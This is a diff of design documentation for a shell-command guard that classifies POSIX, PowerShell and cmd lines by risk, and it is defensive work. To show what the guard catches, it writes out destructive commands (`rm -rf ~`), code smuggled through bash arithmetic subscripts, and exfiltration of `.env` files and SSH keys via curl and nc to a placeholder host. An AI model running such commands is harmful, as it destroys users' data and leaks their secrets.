@@ -37,7 +37,9 @@ A line is judged in three steps.
 The modules follow the steps. `posix`, `powershell` and `cmd` split a line with
 their grammar. `launch` takes wrappers off and reads scripts handed to shells.
 `unit` holds the unit and the helpers that read its arguments. `detect` holds
-the rules. `path` is the shell's side of the path model. `inline` finds the code
+the rules. `values` keeps what a POSIX line sets its variables to, for the
+places bash reads a value again as code. `path` is the shell's side of the
+path model. `inline` finds the code
 an interpreter is given inline and turns what `milo-guards-code` reads in it into
 units (see [Inline code](#inline-code) and [Code](code.md)).
 
@@ -55,7 +57,39 @@ parsers are tree-sitter's bash, PowerShell and batch grammars.
 - Where a grammar reads a line differently from the shell, the shell wins.
   A POSIX line's backslash-newlines are joined first, so `r\<newline>m` is
   `rm`. cmd's built-ins also split arguments at `,`, `;` and `=`. PowerShell's
-  `--%` ends at `|`. PowerShell's grammar knows `>`, `>>`, `2>` to `6>`, `*>`
+  stop-parsing token `--%` hands the rest of the line up to a `|` or the end
+  of the line to the program as written, and the program splits it by its own
+  rules: by the C runtime's (white space between words, double quotes around
+  one, `\"` a quote, backslashes before a quote halved), or, for `cmd`, not
+  at all, as it runs the text as it is (`git --% push --force` is
+  `git_remote`, `cmd /c --% rd /s /q C:\Users\me` a `delete`); a `>` there is
+  the program's argument, a typographic quote is no quote, and `%NAME%` is the
+  environment variable, a known place (`%USERPROFILE%`) or only known when it
+  runs. When the command after cmd's `/c`, `/k` or `/r` starts with a quote,
+  cmd drops the first and the last quote of it unless `/s` came before, there
+  are just two, white space and none of `&<>()@^|` is between them, and what
+  is between them is a program it finds; whether it finds one is not known
+  here, so then both readings are judged (`cmd /c --% "rd /s /q C:\Users\me"`
+  is a `delete`). What follows a `|` after `--%` is read as a script of its
+  own, not as the next stage of the pipeline. PowerShell does not hand a
+  native program an unquoted `$null` at all, nor an empty `$()` or `@()`, nor
+  what a pipeline that ends in `Out-Null` gives, so the arguments after it
+  move up (`git $null push --force` and `git (Out-Null) push --force` are
+  `git push --force`); a cmdlet (a name of an approved verb, a dash and a
+  noun, or a built-in `-Object` cmdlet) binds it, and `'$null'` is a file of
+  that name. PowerShell reads a space that is not an ASCII one (U+0085, U+00A0,
+  U+1680, U+2000 to U+200A, U+2028, U+2029, U+202F, U+205F, U+3000) as a
+  space, a typographic quote (U+2018 to U+201B, U+201C to U+201E) as a quote
+  and an en dash, em dash or horizontal bar at the start of a word as `-`,
+  which its grammar does not, so a line, and each script it runs, is written
+  with the ASCII ones before it is parsed (`Remove-Item<U+00A0>C:\Windows
+  -Recurse` is a `delete`, `iex –Command $x` is `unknown`); inside a string
+  they are the text it holds, as they are after a backtick, in a comment and
+  after `--%`, but a `$( … )` in a double-quoted string or a `@" … "@`
+  here-string is code again. A here-string opens only at the start of a word
+  with nothing after its marker on the line (`ssh me@"host"` is a word with a
+  string in it).
+  PowerShell's grammar knows `>`, `>>`, `2>` to `6>`, `*>`
   and their doubled forms as redirects, but lexes `1>`, `7>` and a `>` glued
   to its word (`echo x>f`, `echo x 1>f`) as words; the guard reads each as the
   redirect it is, with the stream number dropped, and the file glued to it or
@@ -116,11 +150,36 @@ parsers are tree-sitter's bash, PowerShell and batch grammars.
   wherever it stands.
 - Fish has no grammar here. Its line is read as POSIX, which is still safe:
   what the grammar cannot parse comes back risky.
+- The bash grammar reads every word after the operator of a redirect as one
+  more file (`rm 2>/dev/null -rf ~`, `command >out rm -rf ~`) and the shell
+  only the first: the rest are arguments of the command, after the ones
+  written before the redirect, so the line is read as `rm -rf ~`. The same
+  for the words after a here-document's delimiter on the line it starts
+  (`rm <<EOF -rf ~`) and a redirect the grammar holds inside a
+  here-document's (`cat <<EOF > out -n`). On a list, a pipeline or a
+  negation they are the last command's, as the redirect is. A group, a loop,
+  a subshell or a function takes no arguments, and the shell refuses such a
+  line (`{ ls; } > out rm -rf ~`): it is `unreadable`, `has words after a
+  redirect that cannot be read`. So is a declaration (`export`, `declare`,
+  `local`, `readonly`, `typeset`) or an `unset` with words after the file of
+  its redirect (`export 2>/dev/null FOO=1`): the shell runs it, but the
+  grammar reads it as no plain command, and the guard does not give it the
+  words back. A `{NAME}` stuck to a redirect operator (`exec {fd}>out`,
+  `exec {fd}>&-`) is where bash puts the descriptor it opens, not an
+  argument.
 
 ### Wrappers and scripts
 
 Wrappers come off: `sudo`, `env`, `nice`, `timeout`, `xargs`, `find -exec`,
-`Start-Process`, `start`. `sudo rm` is `rm`, run as root. So do the words that
+`Start-Process`, `start`. `sudo rm` is `rm`, run as root. `Start-Process`
+reads its parameters as the cmdlet does: each that takes a value takes the
+next argument whatever it is (`-WindowStyle Hidden`, `-Credential`,
+`-WorkingDirectory`, `-Verb`, `-RedirectStandardInput`, `-ArgumentList
+'-c x'`), so none is left where the program is read; the strings of
+`-ArgumentList` are joined into one command line that the program splits as
+it does after `--%` (`Start-Process psql -ArgumentList '-c "DROP TABLE t"'`
+is `drop_data`); and `-RedirectStandardOutput` and `-RedirectStandardError`
+write their file, as a redirect does. So do the words that
 run the command after them in a POSIX shell: `command`, `builtin`, zsh's
 precommand modifiers `noglob`, `nocorrect` and `-` (they take no options, so
 `noglob -- rm` runs a program named `--`), and `coproc`.
@@ -217,20 +276,55 @@ one (`coproc NAME { … }`). The program is the first word past the name, the
 `{` words that open the group (`coproc { { rm -rf ~; }; }` is read through
 both), `NAME=value` words and `!`, as it is without `coproc`: `coproc FOO=1 rm
 -rf ~`, `coproc { ! rm -rf ~; }` and `coproc NAME { FOO=1 rm -rf ~; }` judge
-the `rm`. The grammar has no `coproc`, so three forms are not read, and are
-risky:
+the `rm`. A redirect in front of the command gives the command its words
+back, as any redirect does (see [Splitting](#splitting)): `coproc { 2>/dev/null
+rm -rf ~; }` and `coproc > out rm -rf ~` are `Delete`. The grammar has no
+`coproc`, so two forms are not read, and are risky:
 
 - A loop, conditional, `case` or function after it, or inside its group
   (`coproc while …; do …; done`, `coproc NAME { for …; do …; done; }`), is cut
   into pieces whose body hides behind the program `do`: `Unreadable`.
-- A redirect in front of the command (`coproc { 2>/dev/null rm -rf ~; }`,
-  `coproc > out rm -rf ~`): the grammar takes the words after its target for
-  more targets, so the command is not among the arguments: `Unreadable`.
 - A `{` stuck to a word (`coproc {rm -rf ~;}`): zsh runs it as a group, the
   grammar reads `{rm` as a program of that name: `Unreadable`.
 
+The other words that start a command of their own are read the same way,
+since the grammar does not read a group or a negation after them either.
+bash's and zsh's `time` (after its `-p`) runs the command after it, past `{`,
+`!` and `NAME=value` words: `time { rm -rf ~; }`, `time ! rm -rf ~` and
+`time FOO=1 rm -rf ~` judge the `rm`. After `!` the grammar reads a group's
+`{` as a program; wherever `{` or `!` is a program, the command after it is
+what runs: `! { rm -rf ~; }` is `Delete`. zsh's `repeat
+N` runs the command or group after its count (`repeat 3 rm -rf ~`, `repeat 3 {
+rm -rf ~; }`), or the list after `do` (`repeat 3 do rm -rf ~; done`). A loop,
+a conditional or a function after any of them (`time for …`, `! while …`), and
+a `{` stuck to a word (`time {rm -rf ~;}`, `! {rm -rf ~;}`), are cut up by the
+grammar as after `coproc`, and are `Unreadable`: a program named `while`, `if`,
+`for` or any of the words that open such a command, and one that starts with a
+`{`, is read so wherever it stands. So is a program named `do`, `then`, `elif`
+or `else`, the body of a loop or a conditional the grammar cut off from the
+words that open it: zsh skips the separators after `repeat`'s count, so
+`repeat 3; do rm -rf ~; done`, on one line or on three, runs the `rm` three
+times, and the grammar reads `repeat 3` and a program named `do`.
+
+The program after a wrapper is the word the shell makes of it. A brace list
+(`command {rm,-rf,~}`, `r{m,x} -rf ~`) or a sequence expression (`r{m..m} -rf
+~`, `{1..3}`, `{a..c}`, `{1..9..2}`) is spelt out into words, the first of
+which is the program: `Unreadable`, `runs a program a brace list names, which
+cannot be read`, behind a wrapper or not (`{rm,-rf,~}` alone is a line the
+grammar cannot parse). The check reads the word as the shell has it after
+quotes are taken out, so a quoted list (`'{rm,-rf,~}'`), which the shell does
+not spell out, is `Unreadable` too. A word with an unquoted wildcard (`./* -rf
+/`, `?? -rf /`, `[r]m`) names the first file it matches, so the program is
+only known when it runs: `Unknown`, as for `$CMD`. A quoted one (`'*' -h`) is
+the name as written; behind a wrapper (`env ./* -rf /`) the guard no longer
+knows whether the word was quoted, and reads a wildcard as one either way,
+also behind zsh's `noglob` (`noglob ./*`), which keeps the shell from
+expanding it. A `[` alone is a name, as the program `[` is.
+
 A script handed to a shell is split again, in its own grammar: `bash -c`,
-`eval`, `cmd /c`, `powershell -Command`, `Invoke-Expression`. A nested script
+`eval`, `cmd /c`, `powershell -Command`, `Invoke-Expression`. So is the value
+of each `NAME=VALUE` a POSIX `alias` defines: what a call of the name runs,
+read where it is defined, as a function's body is. A nested script
 counts as far as a depth limit, and the text of all the nested scripts read
 for one line as far as a budget a few times the longest line; a cmd command
 the guard reads again as a statement of its own (`ver && if …`, `i^f`,
@@ -310,7 +404,13 @@ and its findings are the line's, since the shell runs it as the same user.
   order: source then action for `Register-EngineEvent`; object, event, source
   then action for `Register-ObjectEvent`; class or query, source then action
   for `Register-WmiEvent` and `Register-CimIndicationEvent`.
-  `Register-ObjectEvent $timer Elapsed`, with no action, is safe.
+  `Register-ObjectEvent $timer Elapsed`, with no action, is safe. The
+  `-Action` block of `Set-PSBreakpoint`, which runs when the breakpoint is
+  hit, and a block set as a hook of `$ExecutionContext.InvokeCommand`
+  (`CommandNotFoundAction`, `PreCommandLookupAction`,
+  `PostCommandLookupAction`, `LocationChangedAction`, by assignment or by
+  its `set_` method), which runs when a command is looked up or the location
+  changes, run later the same way.
 - cmd has nothing like it.
 - **`PS4` and `BASH_ENV`** in a POSIX shell. bash expands the value of `PS4`
   (with `$(…)`, backticks and `$((…))`) every time `set -x` prints a trace
@@ -452,12 +552,123 @@ line leaves things, whichever is more conservative and needs the least state:
   it stands, when the trap is set, and is a placeholder variable in the text
   the action is read from, so it is not read twice.
 
+### Values read again as code
+
+bash reads some values a second time, and runs the code it finds in them
+then: a variable's value is code where it is read so, not where it is set.
+
+- **Arithmetic** reads a variable's value as an expression, and a subscript
+  in that expression is expanded, `$(…)` and all: `x='a[$(rm -rf ~)]'; echo
+  $((x))` deletes the home directory. The places that read arithmetic are
+  `$((…))` and `$[…]` (also in the body of an unquoted here-document, where
+  the grammar reads `$((x))` as a command), `((…))`, the three parts of `for
+  ((…))`, each word of `let` (also behind `builtin` and `command`, and spelled
+  `\let` or `'let'`), both sides of `-eq`, `-ne`, `-lt`, `-le`, `-gt` and
+  `-ge` in `[[ … ]]` (not in `[ … ]` and `test`, which read numbers only), an
+  array's subscript (`${a[i]}`, `a[i]=1`, and the key of each `[k]=v` of an
+  indexed array, `a=([k]=v)`; an array declared with `-A` has text keys), the
+  offset and length of `${x:i:j}`, `${@:i:j}` and `${1:i}`, and every value
+  given to a variable the line gives the integer attribute (`declare -i n`,
+  also `local -i`, `typeset -i` and a `declare` behind `builtin` or
+  `command`): an assignment, `read`, `printf -v`, `${n:=…}` and the words of
+  `for n in …` alike. A name in an expression reads its value; so does `$x`
+  in one, `$1` reads the first positional parameter, and `$@` and `$*` read
+  them all. A name that is assigned (`(( x = 1 ))`, `let x=1`) is not read,
+  `x += 1` is, and `${#x}` is a length that reads no value as code.
+- **A subscript in a variable's name** that a builtin reads is arithmetic
+  too: `unset 'a[i]'`, `read 'a[i]'`, `printf -v 'a[i]'`, `getopts o 'a[i]'`,
+  `declare 'a[i]=1'`, `[[ -v a[i] ]]` and `test -v 'a[i]'`.
+- **`${!x}`** reads the variable the value of `x` names, and its subscript as
+  arithmetic: `x='a[$(rm -rf ~)]'; echo ${!x}` deletes, and so does
+  `x='a[i]'; i='a[$(rm -rf ~)]'; echo ${!x}`. In arithmetic, `${!x}` reads
+  the value of each variable the values of `x` name as an expression (`x=y;
+  y='a[$(rm -rf ~)]'; echo $(( ${!x} ))`). `${!x@}`, `${!x*}` and `${!a[@]}`
+  list names and keys and read no value. A reference (`declare -n r=…`, also
+  `local -n` and `typeset -n`, not `export -n`) is read the same way, where
+  it is declared: `declare -n r='a[$(rm -rf ~)]'; echo $r` deletes.
+- **`${x@P}`** expands the value as a prompt: its escapes decoded as a
+  `PS4`'s are (see [Actions that run later](#actions-that-run-later)), then
+  its `$(…)` and backticks run. `${!y@P}` does the same to each variable the
+  values of `y` name. `${x@Q}`, `${x@U}` and the other operators run nothing.
+
+The values are the ones the line gives, wherever it gives them and whether
+or not that runs before the read: an assignment (also after `export`,
+`declare`, `local` and the like, quoted or not, an element of an array, and
+`+=`), each word of a `for` loop, `${x:=v}`, and the positional parameters
+that `set -- …` (or `set` with words after its options) and a call of a
+function the line defines give, from `$1` on. A value written in text is
+read as the code it holds where the read is, `$(…)`, backticks and `${…}`
+(which may itself read another value again), as a nested script whose
+findings are the line's: so the lines above are the `delete` of `~`. A value
+is followed through the names it holds (`x='a[$(rm -rf ~)]'; y=x; echo
+$((y))` deletes too). A value that names no code reads as safe: `x=3; echo
+$((x + 1))`, `i=0; echo ${a[i]}`, `n=$((n + 1))` (an arithmetic expansion is
+a number) and `for i in 1 2 3; do echo $((i * 2)); done`. So does a value
+that is always a number: `$?`, `$#`, `$$`, `$!`, a length (`${#x}`,
+`${#a[@]}`), a range of numbers (`for i in {1..5}`), and the counters bash
+fills (`$RANDOM`, `$SRANDOM`, `$SECONDS`, `$EPOCHSECONDS`, `$LINENO`,
+`$BASHPID`, `$PPID`, `$UID`, `$EUID`) as long as the line names the counter
+nowhere but where it reads it: a counter the line unsets or declares is a
+variable like any other. So `cargo build; rc=$?; [[ $rc -eq 0 ]]`,
+`n=${#arr[@]}; echo $((n-1))` and `x=$RANDOM` stay safe.
+
+A value only known when it runs is `unknown`, with the reason `may run code a
+variable holds that is only known when it runs`, at each place that reads it
+so: one set from a substitution or another variable (`x=$(cat f)`, `x="$y"`),
+by `read`, `mapfile`, `printf -v` or `getopts`, by a `for` over words that
+expand or match names (`for x in *`, `for x in $(seq 5)`, `for x; do`), by
+`${x:=…}` with a quote or an expansion in its word, and pieces joined by `+=`
+when any of them holds a `$` or a backtick (`x='$'; x+='(rm -rf ~)'` is
+`$(rm -rf ~)`). So is a word with a backslash before a `$` or a backtick
+outside quotes (`x=a[\$\(rm\ -rf\ ~\)]`), which the grammar may read
+apart, and every positional parameter once the line shifts them. So is a
+variable given more than 16 distinct values, a value that names more than 256
+variables, and a read that follows more than 64 names. A variable the line
+does not set at all is the environment the caller runs the line in, and is
+not judged (`echo $((COLUMNS - 1))` and `echo $(($1))` stay safe).
+
+The output of a command that arithmetic reads is an expression too, so
+`$(( $(echo 'a[$(rm -rf ~)]') ))` runs the code the command prints. The
+guard cannot know what a program prints, so arithmetic that reads a
+substitution is `unknown`, with the reason `may run code in a command's
+output that arithmetic reads`, wherever it is: `$(( $(cat f) ))`, `[[ $(id -u)
+-eq 0 ]]`, `${a[$(cmd)]}`. This is the price of the rule: some ordinary
+lines become `unknown`, such as `start=$(date +%s); make; echo $((
+$(date +%s) - start ))` and `[[ $(wc -l < f) -gt 0 ]]`, where the programs
+only print numbers. `[ "$(id -u)" -eq 0 ]` reads numbers only and stays
+safe.
+
+The tree is read for the values once, before the walk, and the walk reads
+them again where each read is. That work is kept out of the frame of the
+walk itself, which recurses once for each level of the parse tree, so that a
+line nested to the limit (see [What cannot be read is risky](#what-cannot-be-read-is-risky)) still
+fits a thread's stack.
+
+Quoted text the grammar keeps as text is read as the shell reads it in two
+more places:
+
+- **Single quotes in a `${…}` word inside double quotes** (and in the body of
+  a here-document with an unquoted delimiter, which the shell reads the same
+  way) are text, so what they hold is expanded: `echo "${x:-'$(rm -rf ~)'}"`
+  and `echo "${x/y/'$(rm -rf ~)'}"` delete, and so do a word with text around
+  the quotes (`"${x:-a'$(rm -rf ~)'b}"`), an ANSI-C string (`"${x:-$'…'}"`)
+  and a nested `${…}`. Outside double quotes they quote: `echo ${x:-'$(rm -rf
+  ~)'}` stays safe, as do `echo "${x:-default}"` and `echo "${x:-'a b'}"`. A
+  backslash still escapes there, so ``echo "${x:-'\`'}"`` holds a plain
+  backtick and stays safe.
+- **A backslash inside backticks** before a backtick, a `$` or a backslash
+  goes before the code is read, so an escaped backtick starts a substitution
+  of its own: ```echo "`echo \`rm -rf ~\``"``` deletes. The code is read as
+  the here-document's backticks are (`\"` both ways, bash's and dash's).
+
 ### Where a line is
 
 A `cd` (or `pushd`, or `Set-Location`) moves the rest of the line. A later
 relative path is judged from where it moved to. A `cd` inside a subshell or a
 nested script in a process of its own does not reach the rest of the line;
-`eval` runs in this shell, so its `cd` does; in a pipeline only zsh runs the
+`eval` runs in this shell, so its `cd` does, and so does the `cd` in a string
+PowerShell's `Invoke-Expression` runs (`iex 'cd C:\Windows'`), since the session
+has one location; in a pipeline only zsh runs the
 last stage in this shell, but, as for a `cd`, any stage counts. Where a `cd` went is
 unknown when its target is, and then so is every relative path after it.
 A device (`$null`, `NUL`, `NUL:`, `CON`, `/dev/null`) is the same in any folder,
@@ -594,6 +805,64 @@ line is, as before.
 In PowerShell, `cd -` and `cd +` go back or forward in location history, so the
 place is only known when it runs.
 
+A PowerShell session has one location, whatever scope a block runs in, and
+some of what moves it is not a `cd` the line shows. Then the place, and every
+relative or rooted path after it, is only known when it runs: a script block or
+a script run by a name only known when it runs (`& $b`, `. $b`, `&
+(Get-Command f)`; a block written out, `& { … }`, is read where it stands), an
+`Invoke-Expression` of a string not written out (`iex $s`, `iex "cd $d"`, a
+download), and the process's own folder set by
+`[Environment]::CurrentDirectory = …` or `[IO.Directory]::SetCurrentDirectory`,
+which a .NET call and a program the session starts may take. A method of
+`$ExecutionContext.SessionState.Path` is the cmdlet it stands for, read with
+the string it is given: `SetLocation('C:\Windows')` is `Set-Location
+C:\Windows`, `PushCurrentLocation`, `PopLocation` and `SetDefaultLocationStack`
+the stack steps below. Called on anything else (a variable that may hold the
+paths) the place, and the stack, are only known when it runs.
+
+`Set-Location`, `Push-Location` and `Pop-Location` are read by their own
+parameters, so the value of `-StackName` is not the folder: `Push-Location
+-StackName s C:\Windows` goes to `C:\Windows`. `Push-Location` with no path
+saves where the line is and stays there, and `Set-Location -StackName s` only
+picks the stack the others use when not given one. The line keeps the folders
+`Push-Location` saved, on each stack by name, so a `Pop-Location` goes back to
+the last one saved on its stack, and to every other folder the line may have
+been in then: `Push-Location src; Pop-Location; Remove-Item -Recurse build`
+deletes `<cwd>\build`. Only a step the line is certain to take, in order, is
+kept. After one that may not run or may run again (in a branch, a loop, a
+function body, on the right of `&&` or `||`, behind a wrapper, or in an action
+that runs later), after a block or a script the guard does not read that may
+move the line (`& $b`, `iex $s`), which may save or take a folder too, and
+after a `Pop-Location` of a stack the line did not fill,
+which holds what the session saved before the line, or of a stack only known
+when it runs, a `Pop-Location` goes to a place only known when it runs.
+The same holds after a location cmdlet in a later stage of a pipeline, which
+runs once for each item and may take its folder and its stack from each
+(`Import-Csv s.csv | Pop-Location`); after one given an argument that does not
+bind (`Pop-Location -WhatIf`, `Pop-Location x`, `Push-Location -Foo x`, an
+unknown or ambiguous parameter, a value parameter with no value, more folders
+than it takes, or a splat), which stops it before it does anything; and once
+the line defines a function or sets an alias named as one of them
+(`function Pop-Location { }`, `Set-Alias popd Get-Date`), or an alias whose
+name is only known when it runs (`Set-Alias $n …`, `Import-Alias`), which may
+stand in for it. A process or a runspace of its own (a job's block, a thread
+job's, a `ForEach-Object -Parallel` block, a nested `pwsh -Command`) starts
+with empty stacks, so a `Pop-Location` there takes nothing the line saved and
+goes to a place only known when it runs (`Push-Location C:\Windows; Start-Job
+{ Pop-Location; Remove-Item -Recurse System32 }` deletes
+`C:\Windows\System32`), and the line's stacks are as they were after it.
+
+The blocks of `Start-Job` run in a process of their own, so a `cd` in them does
+not move the line. They start in its `-WorkingDirectory`, joined to where the
+line is (`Start-Job -WorkingDirectory ~ { Remove-Item -Recurse .\build }` deletes
+`~\build`), and where the line is when it names none, as PowerShell 7 starts
+them; Windows PowerShell 5.1 starts such a job in `~\Documents`, which the guard
+does not read. They are read after the
+rest of the command, whose arguments and redirects the session runs before the
+job starts. When a job has more than one block and one of them moves, which
+runs first (`-InitializationScript` runs before the block, wherever it is
+written) is not read, and every path in them is only known when it runs.
+
 In a POSIX shell `pushd` has options before its folder, as `cd` has, and none
 of them is the folder: `-L` and `-P` are skipped (`pushd -P ~/.ssh && cat
 id_rsa` reads `~/.ssh/id_rsa`, a secret, like `cd -P ~/.ssh`), and `-n` changes
@@ -625,9 +894,13 @@ that one path, so a `..` in the name is applied and a device path (`NUL`, `CON`)
 is never the item itself. `$null` is the null value in any provider.
 
 In PowerShell a rooted path with no drive (`\x`, `/x`, as in `cd \`) is on the
-drive of the folder before it, so after `cd HKCU:\Software\Foo` it is
-`HKCU:\x`, and after `cd Function:` it is `Function:\x`; it is on the file
-system only when the folder before it is (a disk, or no earlier `cd` at all).
+drive or share of the folder before it, so after `cd HKCU:\Software\Foo` it is
+`HKCU:\x`, after `cd Function:` it is `Function:\x`, and after `cd
+\\server\share\x` it is `\\server\share\x` (`\\?\UNC\server\share\x` and
+`\\?\C:\x` are read for the share and the drive they name; another `\\?\` or
+`\\.\` folder has no root the guard reads, so the path is only known when it
+runs); it is on the file system only when the folder before it is (a disk, a
+share, or no earlier `cd` at all).
 When that folder is only known when it runs, or is a provider path with no drive (`Registry::HKEY_CURRENT_USER\...`),
 so is the rooted path. `~` is the home of the provider the folder is in, and
 only the file system has one: after a `cd` to the registry, `Function:`, a
@@ -1470,7 +1743,11 @@ a path.
   listed, their short forms and the hex shapes are tried, so a pattern that
   fits some other branch name (`dev`) is not told.
 - A PowerShell provider-qualified path (`FileSystem::C:\x`) is its provider's
-  own path.
+  own path. A relative one (`FileSystem::x`,
+  `Microsoft.PowerShell.Core\FileSystem::x`) is from the folder the line is in,
+  as a plain one is (`cd C:\Windows; Remove-Item -Recurse FileSystem::System32`
+  deletes `C:\Windows\System32`); after a `cd` to another provider, or to a
+  place only known when it runs, it is only known when it runs.
 - A path built at run time, or by a brace list such as `{~,x}`, is unknown.
 - `NUL` is the null device in any folder, and so is PowerShell's `$null` value (see "Where a line is"); in PowerShell a bare `NUL` or `CON` is one only on the file system. In a POSIX shell `$null` is the variable `null`, only known when it runs; in cmd, and quoted in PowerShell, it is a file name. In a longer PowerShell word `$null` is the empty string: `$null\Windows` is `\Windows`, a folder at the top of the disk.
 - In PowerShell and cmd a name is read the way Windows reads it: `.git.`, `.git `
@@ -1684,8 +1961,9 @@ questions are answered apart:
    change what the interpreter's name stands for before it: `alias`,
    `unalias`, `hash` (`hash -p /tmp/x/node node` runs any binary), `enable`,
    or a function defined earlier (`node() { NODE_OPTIONS=… command node
-   "$@"; }`), none of which the code shows; a function body is still read
-   where it is written, and a delete in it is still found.
+   "$@"; }`), none of which the code shows; a function body and an alias's
+   value are still read where they are written, and a delete in them is still
+   found (`alias python3='rm -rf ~'` is a `delete`).
    An option of `bun run` that carries code (`bun -F x run -e CODE`) is
    an option and a subcommand around the code, not read whole.
 3. **The reader understands it** (`milo_guards_code::understand`, the strict
@@ -2128,6 +2406,15 @@ A line is never safe because the guard gave up on it. These come back risky:
   double-quoted span holds `$(` or a backtick (`--format="$(echo a>f)"`).
 - A database statement known only when it runs: `psql -c "$Q"`.
 - A path built at run time or by a brace list.
+- A value only known when it runs where bash reads a value again as code:
+  arithmetic, `${!x}` and `${x@P}` (see
+  [Values read again as code](#values-read-again-as-code)).
+- A program named by a brace list or a wildcard (`command {rm,-rf,~}`, `./*
+  -rf /`).
+- A loop, a conditional or a `{` stuck to a word after `time`, `!`, `coproc`
+  or zsh's `repeat` (`time for …; do …; done`, `! {rm -rf ~;}`), and words
+  after the file of a redirect on a group, a loop or a subshell (`{ ls; } >
+  out rm -rf ~`), which the grammar cuts up.
 - A line the grammar cannot parse.
 - Shells nested past a limit, a parse tree nested too deep, or a line longer
   than the limit.
@@ -2325,9 +2612,15 @@ file that is not one is safe (`scp build/pkg.tar host:/srv/`,
   startup files and the repository's history are sensitive in core too, but
   they hold no secret, so sending one is not this rule. A public key
   (`id_ed25519.pub`) is not one either.
-- An `.env` file anywhere, in the workspace too: `.env` and `.env.*`, not a
-  folder, and not a template (`.env.example`, `.sample`, `.template`, `.dist`).
-  A pattern that can name one (`.env*`, `.e*`, `.*`) counts when the shell
+- An `.env` file anywhere, in the workspace too: `.env`, `.env.*` and a name
+  that ends in `.env` (`prod.env`), not a folder, not a template
+  (`.env.example`, `.sample`, `.template`, `.dist`, `example.env`), and not an
+  encrypted copy (`.env.gpg`, `.pgp`, `.age`, `.enc`, `.vault`), which is made
+  to be committed or sent. An `.envrc` too, and a shell's or a prompt's
+  history (`.bash_history`, `.zsh_history`, `fish_history`, PowerShell's
+  `ConsoleHost_history.txt`, `.python_history`, `.psql_history` and the like),
+  which holds every secret typed on a command line. A pattern that can name an
+  `.env` or `.envrc` file (`.env*`, `.e*`, `.*`) counts when the shell
   expands it, as a word of its own: `-T .env*`, `scp .env* host:`. Part of a
   longer word is not expanded: the shell matches the whole word `@.env*`, which
   names no file, and `curl` reads that name as written, so `curl -d @.env*` is
@@ -2336,33 +2629,100 @@ file that is not one is safe (`scp build/pkg.tar host:/srv/`,
   A name written out under a folder only known when it runs is read by the
   name: `curl -T "$x/.env"`, `cat "$x/.env" | curl -d @- …`, and `$PWD/.env`
   after a `cd` that leaves `$PWD` not plain (`cd -P sub`, `cd "$x"`, `cd d*`)
-  send `.env` from wherever the folder is. Only the name counts: a path core
-  marks by its folder (`$x/.ssh/id_rsa`) needs the folder, which is not known.
+  send `.env` from wherever the folder is. The folder may be the home
+  directory, so a name that core marks as a secret there is one:
+  `curl -T "$x/.ssh/id_rsa"` sends `~/.ssh/id_rsa`.
 - The whole environment: `env`, `printenv`, `set`, `export -p`, `declare -x`,
   `/proc/self/environ`, PowerShell's `Get-ChildItem env:` (`gci`, `dir`).
   One variable (`printenv HOME`, `Get-ChildItem env:PATH`) is not. cmd's bare
   `set` is not read by its grammar and comes back `unreadable`.
+- The GPG secret keys `gpg --export-secret-keys` and `--export-secret-subkeys`
+  print, which no path names.
+- A file the line writes from a secret, for the rest of the line: a copy
+  (`cp`, `mv`, `install`, `ditto`, `ln` and `ln -s`, `dd if= of=`, an `rsync`
+  to a place on this machine; a copy into a folder lands under its own name
+  there), an archive `tar` or `zip` packs it into (`zip x .env` writes
+  `x.zip`), a redirect of what a command that reads it prints (`cat .env >
+  a`, `sort < a > b`, `env > e.txt`), and what `tee` is handed. `env > e.txt;
+  curl -d @e.txt …` and `cp .env /tmp/x && curl -d @/tmp/x …` send it. A file
+  is told by where it lands, as the rule about writing then running tells it.
+  The copies are a graph built once and walked from the secrets, so a copy of
+  a copy is followed to any depth in one walk. A write that goes through what
+  a command prints into a variable (`k=$(cat a); echo "$k" > b`) needs the
+  line followed again once `a` is known to hold a secret: it is, at most four
+  times, and a line that still writes a new such file then is `unreadable`,
+  since what it sends is not known.
+
+**What reads one.** A program given the secret's path, its input, or a file
+redirected onto it, as `read_secret` reads them, with `tar`'s operands joined to
+the folder `-C` (`--directory`) moves it to (`tar czf - -C ~ .ssh` packs
+`~/.ssh`). A program that prints only a name, a listing, a count or a hash
+(`echo`, `printf`, `ls`, `basename`, `dirname`, `realpath`, `stat`, `du`,
+`file`, `wc`, `sha256sum` and the other hashes) reads no secret: `echo .env |
+nc host 1`, `ls ~/.ssh | nc host 1` and `sha256sum .env | nc host 1` send none.
+Under `xargs` it prints what its input holds (`xargs echo < .env`, `xargs -a
+.env echo`), and a list of names it reads from a file is printed (`file -f
+.env`, `wc --files0-from=.env`): those read the file. A program `xargs` runs
+is handed the names such a stage lists (`ls ~/.ssh | xargs cat | nc host 1`
+is sent). The code an interpreter is given is no file name: the value of the
+options that carry code for that interpreter (`node -p 'process.env'`,
+`python3 -c …`, `perl -lne …`, `php -r …`), alone or ending a bundle, and
+not after an option that takes a value of its own (`php -d e .env` and
+`python3 -Wignore .env` run `.env`; PHP prints a file with no `<?php` tag as
+it is). `tar` (creating) and `zip` read their members, not their exclude
+patterns; packing the workspace or a folder that holds it onto the output
+(`tar czf - .`, `zip -r - .`) reads the workspace, which may hold an `.env`
+file, unless its excludes leave every secret name out (see below). `tar -C
+dist .` packs `dist`.
 
 **What sends.**
 
 - **An upload that names the file**: `curl -d @f` (also `--data`,
   `--data-binary`, `--json`, `--data-urlencode name@f`, `-F name=@f` and
-  `name=<f`, `-T f`, `--upload-file`, `-H @f`, in a bundle such as `-sd @f`),
-  `wget --post-file f` and `--body-file`, `http`, `https` and `xh` with
-  `field@f`, `field=@f` or `@f`, and `Invoke-WebRequest` and
-  `Invoke-RestMethod -InFile f`, `Send-MailMessage -Attachments f` (a list),
-  and `Start-BitsTransfer -Source f` when `-TransferType` is `Upload`.
+  `name=<f`, `-T f`, `--upload-file`, `-H @f`, in a bundle such as `-sd @f`;
+  curl expands a `{a,b}` list in `-T`'s name itself, unless `-g`, so `curl -T
+  "{.env,README}"` sends `.env`), `wget --post-file f` and `--body-file`,
+  `http`, `https` and `xh` with `field@f`, `field=@f` or `@f`, and
+  `Invoke-WebRequest` and `Invoke-RestMethod -InFile f`, `Send-MailMessage
+  -Attachments f` (a list), and `Start-BitsTransfer -Source f` when
+  `-TransferType` is `Upload`. Senders that name the file in their own
+  syntax: `socat`'s `FILE:`, `OPEN:`, `GOPEN:` and `READFILE:` addresses
+  (when another of its addresses is a network one: `TCP:`, `UDP:`,
+  `OPENSSL:`, `SOCKS:` and the like), the attachments of `mail`, `mailx`,
+  `s-nail`, `mutt` and `neomutt` (`-a`, `-A`, `--attach`), `gh gist create`
+  (its files, or its input with none or `-`), `az storage blob upload -f`,
+  and an `sftp` batch: the files its `put`, `reput` and `mput` lines name,
